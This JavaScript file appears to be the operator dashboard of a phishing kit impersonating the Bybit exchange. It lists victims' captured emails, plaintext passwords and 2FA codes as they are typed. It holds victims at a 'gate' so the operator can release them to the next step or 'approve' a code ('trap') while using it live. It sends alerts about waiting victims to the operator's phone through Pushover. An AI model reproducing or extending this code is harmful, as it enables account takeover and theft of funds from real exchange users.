


(function () {
  'use strict';

  if (typeof firebase === 'undefined' || !firebase.apps.length) return;

  var auth = firebase.auth();
  var db = firebase.database();

  
  var ADMIN_UID = '61aL9IOHvyfbQO7GJNNoekZq1mU2';

  function $(id) { return document.getElementById(id); }
  var els = {
    auth: $('admAuth'), denied: $('admDenied'), dash: $('admDash'),
    email: $('admEmail'), pass: $('admPass'), err: $('admErr'), btn: $('admBtn'),
    out: $('admOut'), deniedOut: $('admDeniedOut'),
    hdrEmail: $('admHdrEmail'), live: $('admLive'), sound: $('admSound'), notify: $('admNotify'),
    waits: $('admWaits'), waitsEmpty: $('waitsEmpty'), waitCount: $('waitCount'),
    events: $('admEvents'), eventsEmpty: $('eventsEmpty'),
    statWaiting: $('statWaiting'), statLogins: $('statLogins'), statOtp: $('statOtp'),
    relAll: $('relAll'), clearWaits: $('clearWaits'), clearEvents: $('clearEvents'),
    toasts: $('admToasts')
  };

  var state = { sound: true, logins: 0, otp: 0, waits: {}, booted: false };
  try { state.sound = localStorage.getItem('byAdmSound') !== '0'; } catch (e) { }

  
  
  var pushCfg = { userKey: '', appToken: '' };
  var pushCfgLoaded = null;
  function loadPushCfg() {
    if (pushCfgLoaded) return pushCfgLoaded;
    pushCfgLoaded = db.ref('adminConfig/pushover').once('value').then(function (snap) {
      var val = snap.val() || {};
      pushCfg.userKey = val.userKey || '';
      pushCfg.appToken = val.appToken || '';
      if ($('admPushoverKey')) $('admPushoverKey').value = pushCfg.userKey;
      if ($('admPushoverAppToken')) $('admPushoverAppToken').value = pushCfg.appToken;
      return pushCfg;
    }).catch(function () { return pushCfg; });
    return pushCfgLoaded;
  }

  function show(el) { if (el) el.hidden = false; }
  function hide(el) { if (el) el.hidden = true; }
  function setErr(el, text) {
    if (!el) return;
    el.textContent = text;
    el.classList.add('show');
  }
  function clearErr(el) {
    if (!el) return;
    el.textContent = '';
    el.classList.remove('show');
  }

  var AUTH_ERRORS = {
    'auth/invalid-email': 'Please enter a valid email address.',
    'auth/user-not-found': 'No account found with this email.',
    'auth/wrong-password': 'Incorrect password.',
    'auth/invalid-credential': 'Incorrect email or password.',
    'auth/email-already-in-use': 'An account with this email already exists — use Sign In instead.',
    'auth/weak-password': 'Password must be at least 6 characters.',
    'auth/too-many-requests': 'Too many attempts. Wait a moment and try again.',
    'auth/network-request-failed': 'Network error. Check your connection.'
  };
  function errMsg(e) {
    return (e && AUTH_ERRORS[e.code]) || (e && e.message) || 'Something went wrong.';
  }

  
  function beep() {
    if (!state.sound) return;
    try {
      var Ctx = window.AudioContext || window.webkitAudioContext;
      var ctx = new Ctx();
      var osc = ctx.createOscillator();
      var gain = ctx.createGain();
      osc.type = 'sine';
      osc.frequency.value = 880;
      gain.gain.setValueAtTime(0.0001, ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.2, ctx.currentTime + 0.02);
      gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.6);
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start();
      osc.stop(ctx.currentTime + 0.65);
      osc.onended = function () { try { ctx.close(); } catch (e) { } };
    } catch (e) { }
  }
  function toast(title, body) {
    if (!els.toasts) return;
    var t = document.createElement('div');
    t.className = 'toast';
    var tt = document.createElement('div');
    tt.className = 'toast-t';
    tt.textContent = title;
    var tb = document.createElement('div');
    tb.className = 'toast-b';
    tb.textContent = body;
    t.appendChild(tt);
    t.appendChild(tb);
    els.toasts.appendChild(t);
    while (els.toasts.childNodes.length > 4) els.toasts.removeChild(els.toasts.firstChild);
    setTimeout(function () {
      t.classList.add('out');
      setTimeout(function () { if (t.parentNode) t.parentNode.removeChild(t); }, 300);
    }, 6000);
  }
  function deskNotify(title, body) {
    try {
      if ('Notification' in window && Notification.permission === 'granted' && document.hidden) {
        new Notification(title, { body: body });
      }
    } catch (e) { }
  }
  var baseTitle = document.title;
  var newCount = 0;
  function flashTitle() {
    newCount++;
    document.title = '(' + newCount + ') ' + baseTitle;
  }
  function resetTitle() {
    newCount = 0;
    document.title = baseTitle;
  }
  window.addEventListener('focus', resetTitle);
  document.addEventListener('visibilitychange', function () { if (!document.hidden) resetTitle(); });

  
  function fmtTime(ts) {
    var d = new Date(ts || Date.now());
    return isNaN(d.getTime()) ? '' : d.toLocaleTimeString();
  }
  function fmtWait(ms) {
    var s = Math.max(0, Math.round(ms / 1000));
    if (s < 60) return s + 's';
    return Math.floor(s / 60) + 'm ' + (s % 60) + 's';
  }
  function el(tag, cls, text) {
    var n = document.createElement(tag);
    if (cls) n.className = cls;
    if (text != null) n.textContent = text;
    return n;
  }
  function credChip(text) {
    var b = el('button', 'adm-pass', text);
    b.type = 'button';
    b.title = 'Click to copy';
    b.addEventListener('click', function () {
      try { navigator.clipboard.writeText(text); } catch (e) { }
      var old = b.textContent;
      b.textContent = 'Copied ✓';
      setTimeout(function () { b.textContent = old; }, 1200);
    });
    return b;
  }
  
  function methodName(m) {
    if (m === 'email') return 'Email code';
    if (m === 'sms') return 'SMS code';
    if (m === 'app' || m === 'totp') return '2FA code';
    return m ? String(m) : 'Code';
  }

  
  function renderEvent(id, d) {
    if ($('ev-' + id)) return; 
    var isOtp = d.type === 'otp';
    var card = el('div', 'adm-card');
    card.id = 'ev-' + id;

    var main = el('div', 'adm-card-main');
    var top = el('div', 'adm-card-top');
    top.appendChild(el('span', 'adm-badge ' + (isOtp ? 'otp' : 'login'), isOtp ? '2FA code' : 'Login'));

    var st = String(d.status || '');
    if (st.indexOf('failed') === 0) top.appendChild(el('span', 'adm-badge fail', 'Failed'));
    else if (st === 'success') top.appendChild(el('span', 'adm-badge ok', 'Success'));
    else if (st === 'submitted') top.appendChild(el('span', 'adm-badge ok', 'Submitted'));
    else top.appendChild(el('span', 'adm-badge', st || '…'));

    top.appendChild(el('span', 'adm-email', d.email || '(unknown)'));
    top.appendChild(el('span', 'adm-time', fmtTime(d.ts)));
    main.appendChild(top);

    var meta = el('div', 'adm-meta');
    if (isOtp) {
      
      
      meta.appendChild(el('span', null, (d.label || methodName(d.method)) + ': '));
      var codeWrap = el('span', null, 'Code: ');
      codeWrap.appendChild(el('span', 'adm-code', d.code || '—'));
      meta.appendChild(codeWrap);
    } else {
      var pwWrap = el('span', null, 'Password: ');
      pwWrap.appendChild(credChip(d.password || '(empty)'));
      meta.appendChild(pwWrap);
    }
    main.appendChild(meta);
    card.appendChild(main);
    els.events.insertBefore(card, els.events.firstChild);
    while (els.events.childNodes.length > 150) els.events.removeChild(els.events.lastChild);
    hide(els.eventsEmpty);

    state.logins += isOtp ? 0 : 1;
    state.otp += isOtp ? 1 : 0;
    els.statLogins.textContent = state.logins;
    els.statOtp.textContent = state.otp;

    
    if (Date.now() - (d.ts || 0) < 15000) {
      beep();
      if (isOtp) {
        toast((d.label || methodName(d.method)) + ' submitted', (d.email || '') + ' entered ' + (d.code || ''));
        deskNotify((d.label || methodName(d.method)) + ' submitted', (d.email || '') + ' entered ' + (d.code || ''));
      } else {
        toast('New login', (d.email || '') + ' — ' + (d.password || ''));
        deskNotify('New login', (d.email || '') + ' — ' + (d.password || ''));
      }
      flashTitle();
    }
  }

  
  function renderWaits() {
    els.waits.innerHTML = '';
    var keys = Object.keys(state.waits).sort(function (a, b) {
      return (state.waits[a].ts || 0) - (state.waits[b].ts || 0);
    });
    keys.forEach(function (sid) {
      var d = state.waits[sid] || {};
      var isLogin = d.stage === 'login';
      var card = el('div', 'adm-card');
      var main = el('div', 'adm-card-main');
      var top = el('div', 'adm-card-top');
      top.appendChild(el('span', 'adm-badge ' + (isLogin ? 'login' : 'otp'), isLogin ? 'Waiting at login' : 'Waiting at 2FA'));
      top.appendChild(el('span', 'adm-email', d.email || '(unknown)'));
      var w = el('span', 'adm-wait');
      w.setAttribute('data-ts', d.ts || Date.now());
      w.textContent = 'waiting 0s';
      top.appendChild(w);
      main.appendChild(top);

      var meta = el('div', 'adm-meta');
      if (!isLogin) {
        
        
        if (d.codes && typeof d.codes === 'object') {
          var anyEntered = false;
          ['email', 'sms', 'app'].forEach(function (m) {
            var c = d.codes[m];
            if (!c) return;
            var val = (typeof c === 'object') ? (c.code || '') : String(c);
            if (val) {
              anyEntered = true;
              var got = el('span', null, methodName(m) + ': ');
              got.appendChild(el('span', 'adm-code', String(val)));
              meta.appendChild(got);
            }
          });
          if (!anyEntered) meta.appendChild(el('span', null, 'Awaiting code entry…'));
        } else {
          
          if (d.method) meta.appendChild(el('span', null, methodName(d.method) + ': '));
          if (d.code) {
            var got = el('span', null, 'Code: ');
            got.appendChild(el('span', 'adm-code', String(d.code)));
            meta.appendChild(got);
          } else {
            meta.appendChild(el('span', null, 'Awaiting code entry…'));
          }
        }
      }
      main.appendChild(meta);
      card.appendChild(main);

      var rel = el('button', 'adm-rel', isLogin ? 'Release → 2FA' : 'Approve code (trap)');
      rel.type = 'button';
      rel.addEventListener('click', function () {
        rel.disabled = true;
        rel.textContent = 'Releasing…';
        db.ref('gate/' + sid + '/released').set(true).catch(function () {
          rel.disabled = false;
          rel.textContent = isLogin ? 'Release → 2FA' : 'Approve code (trap)';
        });
      });
      card.appendChild(rel);
      els.waits.appendChild(card);
    });
    var n = keys.length;
    els.waitCount.textContent = n;
    els.waitCount.className = 'adm-count' + (n ? '' : ' zero');
    els.statWaiting.textContent = n;
    if (n) hide(els.waitsEmpty); else show(els.waitsEmpty);
  }
  function updateWaitTimes() {
    els.waits.querySelectorAll('.adm-wait').forEach(function (w) {
      w.textContent = 'waiting ' + fmtWait(Date.now() - Number(w.getAttribute('data-ts') || Date.now()));
    });
  }

  
  var waitTimer = null;

  
  
  
  
  
  
  
  var notifiedWaits = {};
  function notifyWaiting(v) {
    if (!v || !v.ts) return;
    if (Date.now() - (v.ts || 0) > 15000) return; 
    if (v.stage === 'login') return;              
    if (v.stage === 'code-waiting') return;       
    var tag = v.stage + ':' + v.ts;
    if (notifiedWaits[tag]) return;
    notifiedWaits[tag] = true;
    pushoverSend('Bybit Admin: 2FA waiting for approval',
      'Email: ' + (v.email || 'unknown') + '\nOpen the dashboard to approve their code.').catch(function (e) {
        console.warn('[Pushover] waiting-row push failed:', e && e.message);
      });
  }

  function dbErr(err) {
    var b = $('admDbErr');
    if (b) {
      b.hidden = false;
      b.textContent = 'Database error: ' + ((err && err.code) || err || 'unknown')
        + ' — the dashboard cannot see live data. Check the database rules (firebase deploy --only database).';
    }
  }
  function attach() {
    if (state.booted) return;
    state.booted = true;
    db.ref('.info/connected').on('value', function (s) {
      if (!els.live) return;
      els.live.lastChild.textContent = s.val() ? 'Live' : 'Reconnecting…';
    });
    db.ref('events').limitToLast(150).on('child_added', function (snap) {
      renderEvent(snap.key, snap.val() || {});
    }, dbErr);
    db.ref('gate').on('child_added', function (snap) {
      state.waits[snap.key] = snap.val() || {};
      renderWaits();
      notifyWaiting(snap.val() || {});
    }, dbErr);
    db.ref('gate').on('child_changed', function (snap) {
      state.waits[snap.key] = snap.val() || {};
      renderWaits();
    }, dbErr);
    db.ref('gate').on('child_removed', function (snap) {
      delete state.waits[snap.key];
      renderWaits();
    }, dbErr);
    clearInterval(waitTimer);
    waitTimer = setInterval(updateWaitTimes, 1000);
  }
  function detach() {
    state.booted = false;
    state.waits = {};
    clearInterval(waitTimer);
    db.ref('events').off();
    db.ref('gate').off();
    els.events.innerHTML = '';
    els.waits.innerHTML = '';
    show(els.eventsEmpty);
    show(els.waitsEmpty);
    state.logins = 0;
    state.otp = 0;
    els.statLogins.textContent = '0';
    els.statOtp.textContent = '0';
    els.statWaiting.textContent = '0';
  }

  
  function renderSoundBtn() {
    els.sound.textContent = state.sound ? '🔔 Sound on' : '🔕 Sound off';
    els.sound.className = 'adm-hbtn' + (state.sound ? '' : ' is-off');
  }

  function enterDash(user) {
    hide(els.auth);
    hide(els.denied);
    show(els.dash);
    show(els.out);
    show(els.live);
    els.hdrEmail.textContent = user.email || user.uid;
    els.hdrEmail.title = 'UID: ' + user.uid;
    if ('Notification' in window && Notification.permission === 'default') show(els.notify);
    renderSoundBtn();

    
    loadPushCfg();

    attach();
  }
  function showDenied(user) {
    hide(els.auth);
    hide(els.dash);
    show(els.denied);
    var why = $('admDeniedWhy');
    if (why && user) {
      why.textContent = 'Signed in as UID: ' + user.uid + ' — the admin UID is: ' + ADMIN_UID;
    }
    renderSoundBtn();
  }

  function checkAdmin(user) {
    if (user.uid === ADMIN_UID) enterDash(user);
    else showDenied(user);
  }

  auth.onAuthStateChanged(function (user) {
    if (!user) {
      hide(els.dash);
      hide(els.denied);
      hide(els.out);
      hide(els.live);
      show(els.auth);
      els.hdrEmail.textContent = '';
      detach();
      return;
    }
    checkAdmin(user);
  });

  
  
  els.btn.addEventListener('click', function () {
    clearErr(els.err);
    var em = (els.email.value || '').trim();
    var pw = els.pass.value || '';
    if (!em || pw.length < 6) {
      setErr(els.err, 'Enter your email and a password of at least 6 characters.');
      return;
    }
    els.btn.disabled = true;
    auth.signInWithEmailAndPassword(em, pw)
      .then(function () {
        els.btn.disabled = false;
        els.pass.value = '';
      })
      .catch(function (e) {
        els.btn.disabled = false;
        setErr(els.err, errMsg(e));
      });
  });

  
  function signOutNow() { auth.signOut(); }
  els.out.addEventListener('click', signOutNow);
  els.deniedOut.addEventListener('click', signOutNow);
  els.sound.addEventListener('click', function () {
    state.sound = !state.sound;
    try { localStorage.setItem('byAdmSound', state.sound ? '1' : '0'); } catch (e) { }
    renderSoundBtn();
    if (state.sound) beep();
  });
  els.notify.addEventListener('click', function () {
    try {
      Notification.requestPermission().then(function (p) {
        if (p === 'granted') {
          hide(els.notify);
          deskNotify('Desktop alerts enabled', 'You will get alerts while this tab is in the background.');
        }
      });
    } catch (e) { }
  });
  els.relAll.addEventListener('click', function () {
    Object.keys(state.waits).forEach(function (sid) {
      db.ref('gate/' + sid + '/released').set(true).catch(function () { });
    });
  });
  els.clearWaits.addEventListener('click', function () {
    Object.keys(state.waits).forEach(function (sid) {
      db.ref('gate/' + sid).remove().catch(function () { });
    });
  });
  els.clearEvents.addEventListener('click', function () {
    els.events.innerHTML = '';
    show(els.eventsEmpty);
  });

  
  
  
  
  function pushoverPost(token, user, title, message) {
    var fd = new FormData();
    fd.append('token', token);
    fd.append('user', user);
    fd.append('title', title);
    fd.append('message', message);
    return fetch('https://api.pushover.net/1/messages.json', {
      method: 'POST',
      body: fd,
      keepalive: true
    }).then(function (res) {
      return res.json().catch(function () { return {}; }).then(function (j) {
        if (!res.ok || !j || j.status !== 1) {
          var reason = (j && j.errors && j.errors.length)
            ? j.errors.join(' ')
            : ('HTTP ' + res.status);
          throw new Error(reason);
        }
        return j;
      });
    });
  }

  
  function pushoverSend(title, message) {
    return loadPushCfg().then(function (cfg) {
      if (!cfg.userKey || !cfg.appToken) {
        throw new Error('Pushover keys are not configured — fill in both fields and press Save Keys.');
      }
      return pushoverPost(cfg.appToken, cfg.userKey, title, message);
    });
  }

  function pushStatus(text, ok) {
    var el = $('pushoverStatus');
    if (!el) return;
    el.hidden = !text;
    el.textContent = text || '';
    el.style.color = ok ? '#22c55e' : '#ef4444';
  }

  function pushoverFieldValues() {
    var uk = ($('admPushoverKey') && $('admPushoverKey').value || '').trim();
    var at = ($('admPushoverAppToken') && $('admPushoverAppToken').value || '').trim();
    return { userKey: uk, appToken: at };
  }

  var savePushoverBtn = $('savePushover');
  if (savePushoverBtn) {
    savePushoverBtn.addEventListener('click', function () {
      var v = pushoverFieldValues();
      if (!v.userKey || !v.appToken) {
        pushStatus('Enter BOTH your Pushover User Key and API App Token.', false);
        return;
      }
      savePushoverBtn.disabled = true;
      pushStatus('Validating keys…', true);

      
      
      pushoverPost(v.appToken, v.userKey, 'Bybit Admin — keys verified',
        'Your Pushover keys are valid. Login attempts and 2FA codes will now be pushed here.')
        .then(function () {
          return db.ref('adminConfig/pushover').set({
            userKey: v.userKey,
            appToken: v.appToken,
            updatedAt: firebase.database.ServerValue.TIMESTAMP
          });
        })
        .then(function () {
          
          pushCfg.userKey = v.userKey;
          pushCfg.appToken = v.appToken;
          savePushoverBtn.disabled = false;
          pushStatus('Saved ✓ test message sent — check your phone.', true);
        })
        .catch(function (e) {
          savePushoverBtn.disabled = false;
          pushStatus('Not saved — Pushover rejected the keys: ' + (e && e.message), false);
        });
    });
  }

  var testPushoverBtn = $('testPushover');
  if (testPushoverBtn) {
    testPushoverBtn.addEventListener('click', function () {
      var v = pushoverFieldValues();
      if (!v.userKey || !v.appToken) {
        pushStatus('Enter BOTH keys first, then press Save Keys.', false);
        return;
      }
      testPushoverBtn.disabled = true;
      pushStatus('Sending test…', true);
      pushoverPost(v.appToken, v.userKey, 'Bybit Admin — test',
        'Test from the dashboard at ' + new Date().toLocaleString() + '. You should get one of these for every login.')
        .then(function () {
          testPushoverBtn.disabled = false;
          pushStatus('Test sent ✓ — check your phone.', true);
        })
        .catch(function (e) {
          testPushoverBtn.disabled = false;
          pushStatus('Failed: ' + (e && e.message), false);
        });
    });
  }
})();

